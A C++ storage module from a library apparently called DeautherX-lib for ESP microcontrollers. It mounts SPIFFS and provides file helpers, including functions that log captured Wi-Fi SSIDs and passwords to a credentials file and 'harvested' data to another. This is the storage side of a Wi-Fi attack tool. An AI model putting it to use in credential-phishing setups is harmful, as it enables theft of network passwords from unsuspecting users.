/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License */

#include "DeautherStorage.h"
#include <FS.h>

namespace DStorage {

bool begin() {
    if (!SPIFFS.begin()) {
        Serial.println(F("[Storage] SPIFFS mount failed! Attempting format..."));
        if (SPIFFS.format()) {
            Serial.println(F("[Storage] SPIFFS formatted successfully."));
            return SPIFFS.begin();
        }
        return false;
    }
    return true;
}

bool appendLine(const char* filepath, const String& line) {
    if (!filepath) return false;
    File f = SPIFFS.open(filepath, "a");
    if (!f) return false;
    size_t written = f.println(line);
    f.close();
    return written > 0;
}

bool saveCredential(const char* ssid, const char* password) {
    String j = F("{\"ts\":");
    j += millis(); // Note: ideally RTC time if available
    j += F(",\"ssid\":\""); j += ssid;
    j += F("\",\"password\":\""); j += password;
    j += F("\"}");
    return appendLine("/credentials.jsonl", j);
}

bool saveData(const char* dataType, const String& jsonData) {
    String j = F("{\"ts\":");
    j += millis();
    j += F(",\"type\":\""); j += dataType;
    j += F("\",\"data\":"); j += jsonData;
    j += F("}");
    return appendLine("/harvested.jsonl", j);
}

bool readLines(const char* filepath, ReadCb cb) {
    if (!filepath || !cb) return false;
    File f = SPIFFS.open(filepath, "r");
    if (!f) return false;
    bool go = true;
    while (go && f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) go = cb(line);
    }
    f.close();
    return true;
}

uint32_t countLines(const char* filepath) {
    if (!filepath) return 0;
    File f = SPIFFS.open(filepath, "r");
    if (!f) return 0;
    uint32_t count = 0;
    while (f.available()) {
        f.readStringUntil('\n');
        count++;
    }
    f.close();
    return count;
}

bool remove(const char* filepath) {
    if (!filepath) return false;
    return SPIFFS.remove(filepath);
}

bool exists(const char* filepath) {
    if (!filepath) return false;
    return SPIFFS.exists(filepath);
}

uint32_t size(const char* filepath) {
    if (!filepath) return 0;
    File f = SPIFFS.open(filepath, "r");
    if (!f) return 0;
    uint32_t s = f.size();
    f.close();
    return s;
}

void printFile(const char* filepath) {
    if (!filepath) return;
    File f = SPIFFS.open(filepath, "r");
    if (!f) {
        Serial.println(F("[Storage] File not found."));
        return;
    }
    Serial.println(F("--- File Start ---"));
    while (f.available()) {
        Serial.write(f.read());
    }
    Serial.println();
    Serial.println(F("--- File End ---"));
    f.close();
}

} // namespace DStorage
